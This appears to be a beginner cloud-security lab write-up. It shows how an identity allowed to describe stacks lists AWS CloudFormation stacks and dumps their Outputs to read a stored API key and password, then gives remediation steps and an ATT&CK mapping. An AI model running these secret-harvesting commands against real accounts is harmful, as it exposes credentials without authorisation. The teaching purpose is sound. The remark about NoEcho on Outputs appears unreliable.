# CloudFormation Stack Outputs — Secret Exposure

**Difficulty:** Beginner | **Provider:** AWS | **Category:** Infrastructure / Secrets

## Scenario

An engineering team deploys their application stack with CloudFormation. In a rush
to get things shipped, they stored the database password and an internal API key
directly in the stack **Outputs** section — intending to reference them in dependent
stacks via `Fn::ImportValue`.

Any IAM identity with `cloudformation:DescribeStacks` can read every output in
plaintext, even `NoEcho` outputs prior to AWS's enforcement, and outputs that were
never marked `NoEcho` at all.

## Attack Path

```
[Attacker] cf-reader-<id> (cloudformation:DescribeStacks + cloudformation:ListStacks)
    |
    v
aws cloudformation list-stacks  -->  find the cumulonimbus-app-* stack
    |
    v
aws cloudformation describe-stacks --stack-name <name>
    |
    v
Outputs[].OutputValue  -->  flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — List stacks

```bash
aws cloudformation list-stacks \
  --stack-status-filter CREATE_COMPLETE \
  --profile attacker \
  --query "StackSummaries[*].{Name:StackName,Status:StackStatus}"
```

### Step 3 — Dump the stack outputs

```bash
aws cloudformation describe-stacks \
  --stack-name <stack_name> \
  --profile attacker \
  --query "Stacks[0].Outputs"
```

The `ApiKey` output contains the flag.

## How to Fix in Production

1. **Never store secrets in CloudFormation Outputs** — use Secrets Manager or SSM
   Parameter Store and pass ARNs/paths between stacks.
2. **Mark sensitive outputs `NoEcho: true`** — this prevents the value appearing in
   the console, but note that `DescribeStacks` API still returned them until 2022.
   Rely on IAM, not `NoEcho`, as your primary control.
3. **Restrict `cloudformation:DescribeStacks`** to CI/CD roles and operations teams
   only — not to application-level IAM users.
4. **Audit existing stacks** with `aws cloudformation describe-stacks` and review
   all Outputs for embedded secrets.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Cloud Infrastructure Discovery | T1580 |
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Valid Accounts: Cloud Accounts | T1078.004 |
